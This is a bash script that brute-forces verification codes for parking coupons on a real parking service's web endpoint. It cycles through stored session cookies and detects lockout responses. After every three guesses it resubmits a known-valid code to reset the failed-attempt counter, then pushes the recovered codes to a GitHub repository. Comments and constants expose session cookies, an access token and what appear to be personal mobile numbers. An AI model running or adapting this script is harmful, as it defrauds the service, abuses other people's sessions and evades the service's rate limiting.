#!/bin/bash
ck=$1;shift; n1=$1;shift; n2=$1;shift;

# 892972fd5a016156bfad33c119ce1283a801e3f6 13521838587 20191020
# 6a0b36cde3bf78babfce15b8da8af79dc694b231 18515987963 20190901
# 8db19b98f9f8e97820da19772e77875d90407413 18866674211 20191023
# 364beeb9d67580f6ab8f1906e36f576a7ff3925d 18866674180 20191023
#
# b45c33cf0ab69f59fe21fa13d0000980fa6a0548 17109324204 20191023
# 4a961a7390091a410675839e8d4622bf8b37fef7 17109324204 20191020 1023 x
# 25c04bd9b5b7e78a44f5546219dacd1d2fa8913f 13001077534 20191014 1023 slow
# d3b9dfd6bdb0e7ef840622cb5e40354e612cf539 13521838587 20191014
# 6424b6c327b5eb5961733b3de77834f38b21104f 13521838587 20190915
#
#如果速度很慢，重新登录换一个Cookie

# const param
id_k="BkPTdVZaOYaoML6UwMGJyg=="
id_h="ZT5pUv4JKL1tomT0u9SEdA=="

query_park()
{
    p_c=$1;shift;
    p_code=$1;shift;
    p_id=$1;shift;

    curl -L "http://wx.parkingwang.com/coupon/coupon_show?coupon=${p_id}&verification=${p_code}" \
    -H "Cookie: parking_ses=${p_c}" \
    -H 'Connection: keep-alive' \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36' \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' \
    -H 'Referer: http://wx.parkingwang.com/coupon/input_code?coupon_id=BkPTdVZaOYaoML6UwMGJyg==' \
    -H 'Accept-Encoding: gzip, deflate' \
    -H 'Accept-Language: zh-CN,zh;q=0.9' \
    -H 'misctooltoken: c6d1ad2b9afs4fbab56aaa3e0267deb9' --compressed 2>&1 | egrep "(alert)|(span)" | paste -s -d ":" -
}

parse_res()
{
    p_res=$1;shift;
    if echo "${p_res}" | grep -q "请输入车牌"
    then
        echo "res:success"
    elif echo "${p_res}" | grep -q "输入您的手机号码"
    then
        echo "res:fail:ck:login"
    elif echo "${p_res}" | grep -q "输入错误验证码次数过多"
    then
        echo "res:fail:ck:block"
    elif echo "${p_res}" | grep -q "请求参数错误"
    then
        echo "res:fail:id:param"
    elif echo "${p_res}" | grep -q "优惠券不存在"
    then
        p_n=`echo "${p_res}" | egrep  "(优惠券不存在)" | grep -o "[0-9]次" | grep -o "[0-9]"`
        [ "${p_n}x" == "x" ] && p_n="x"
        echo "res:fail:code:${p_n}"
    elif echo "${p_res}" | grep -q "没有优惠券了"
    then
        p_n=`echo "${p_res}" | egrep  "(没有优惠券了)" | grep -o "[0-9]次" | grep -o "[0-9]"`
        echo "res:fail:code:${p_n}"
    else
        echo ${p_res}
    fi
}

check_park()
{
    p_c=$1;shift;
    p_code=$1;shift;
    p_id=$1;shift;

    # BkPTdVZaOYaoML6UwMGJyg==
    # ZT5pUv4JKL1tomT0u9SEdA==
    [ "${p_code}x" == "x" ] && p_code="242"
    [ "${p_id}x" == "x" ] && p_id="BkPTdVZaOYaoML6UwMGJyg=="
    #echo "ck=#${p_c}# code=#${p_code}# id=#${p_id}#"

    p_html=`query_park ${p_c} ${p_code} ${p_id}`
    parse_res "${p_html}"
}

do_try()
{
    p_ck=$1;shift;
    p_code=$1;shift;
    p_s=`check_park ${p_ck} ${p_code} ${id_h}`
    if echo "${p_s}" | grep -q "res:success"
    then
        echo -n -e " [\\033[32m\\033[1m${p_code}\\033[0m]"
        res_code="${res_code}${p_code} "
    else
        ns=`echo "${p_s}" | grep "res:fail:code" | cut -d ":" -f 4`
        [ "${ns}z" == "z" ] && ns="Q"
        [ "${ns}z" == "xz" ] && echo -n -e " \\033[31m\\033[1m$(printf "%3d" ${p_code})\\033[0m|${ns}" || echo -n " $(printf "%3d" ${p_code})|${ns}"
   fi
}

sendgit()
{
    p_file=$1;shift;
    p_linen=$1;shift;
    p_msg=$*

    p_dir=~/work/code/github/board
    p_tmpfile="tmp_${p_file}.tmp"
    p_gittime=`date +"%Y-%m-%d %H:%M:%S"`

    echo "${p_gittime} ${p_msg}" | cat - ${p_dir}/${p_file} | head -n ${p_linen} > ${p_tmpfile}
    cat ${p_tmpfile} > ${p_dir}/${p_file}
    cd ${p_dir} && git commit -a -m "add line by cmd"
    cd ${p_dir} && git push
}

# test cookie
best_ck="6424b6c327b5eb5961733b3de77834f38b21104f"
besk_ckt=999
ck_OK_n=0
for ick in \
    892972fd5a016156bfad33c119ce1283a801e3f6 \
    6a0b36cde3bf78babfce15b8da8af79dc694b231 \
    8db19b98f9f8e97820da19772e77875d90407413 \
    364beeb9d67580f6ab8f1906e36f576a7ff3925d
do
    cks1=`date +%s`
    check_park ${ick} | grep -q "res:success" && ck_flag="Y" || ck_flag="n"
    cks2=`date +%s`
    ck_t=$((cks2-cks1))
    echo -n "[$(printf "%3d" ${ck_t})] ${ck_flag} ${ick}"
    [ "${ck_flag}x" == "Yx" ] && ck_OK_n=$((ck_OK_n+1))
    [ "${ck_flag}x" == "Yx" -a ${ck_t} -lt ${besk_ckt} ] && { besk_ckt=${ck_t}; best_ck="${ick}"; echo " U"; } || { echo " -"; }
done
echo "ckN:${ck_OK_n} T:${besk_ckt} ${best_ck}"

[ "${ck}x" == "x" ] && ck="${best_ck}"
[ "${n1}x" == "x" ] && n1=1
[ "${n2}x" == "x" ] && n2=999
echo -n -e "\\033[32m\\033[1m$ BEGIN \\033[0m "; date +"%Y-%m-%d %H:%M:%S"; echo " begin=${n1} end=${n2} ck=${ck}"

#ok_info
code_k="242"
code_h="116"
ok_id="${id_k}"
ok_code="${code_k}"

#result
res_code=""
resfile=tmpResultCode.tmp

okN=0
failN=0
checkRes=""
touch ${resfile}
for i in `cat ${resfile}`
do
    s=`check_park ${ck} ${i} ${id_h}`
    if echo "${s}" | grep -q "res:success" 
    then
        okN=$((okN+1))
        res_code="${res_code}${i} "
        checkRes="${checkRes}[${i}]<ok>"
    else
        failN=$((failN+1))
        checkRes="${checkRes}[${i}]<fail>"
    fi
done
checkPassFlag="no"
needSaveGitCode="no"
if [ ${okN} -ge 1 ]
then
    if [ ${okN} -ge 2 -o ${failN} -eq 0 ]
    then
        checkPassFlag="yes"
        [ ${failN} -gt 0 ] && needSaveGitCode="yes"
    fi
fi
logTxt="ckN=${ck_OK_n} T=${besk_ckt} codeN=${okN}:${failN} checkPass=${checkPassFlag} syncGit=${needSaveGitCode} checkRes=${checkRes} ck=${ck}"
echo ${logTxt}

# send by github
sendgit crontab.log 50 ${logTxt}


if [ "${checkPassFlag}x" == "yesx" ]
then
    # sync code to git if need
    if [ "${needSaveGitCode}x" == "yesx" ]
    then
        echo "${res_code}" > ${resfile}
        sendgit vcode.txt 7 ${res_code}
    fi
    exit 0
fi



d1=`date +"%Y-%m-%d %H:%M:%S"`
ln=30
n=0
lc=0
echo -n `date +%H:%M:%S`
for i in `seq ${n1} 3 ${n2}`
do 
    j=${i}
    # reset code
    rstSucFlag="false"
    for idxRst in `seq 1 9`
    do
        check_park ${ck} | grep -q "res:success" && echo -n " Y${idxRst}" && rstSucFlag="success" && break
    done
    [ "${rstSucFlag}x" != "successx" ] && { echo " Fail"; exit 1; }
    
    do_try ${ck} ${j}; n=$((n+1)); lc=$((lc+1)); j=$((j+1));
    do_try ${ck} ${j}; n=$((n+1)); lc=$((lc+1)); j=$((j+1));
    do_try ${ck} ${j}; n=$((n+1)); lc=$((lc+1)); j=$((j+1));
    if [ ${lc} -ge ${ln} ]
    then
        echo ""
        echo -n `date +%H:%M:%S`
        lc=0
    fi
done
d2=`date +%Y-%m-%d#%H:%M:%S`
echo ""
res_code=`echo "${res_code}" | grep "[0-9]\+" -o | sort  -n  | uniq | paste -s -d " " -`
echo "beginT=${d1} endT=${d2} n=${n} res_code=${res_code}"
echo "${res_code}" > ${resfile}


# send by github
sendgit vcode.txt 7 ${res_code}

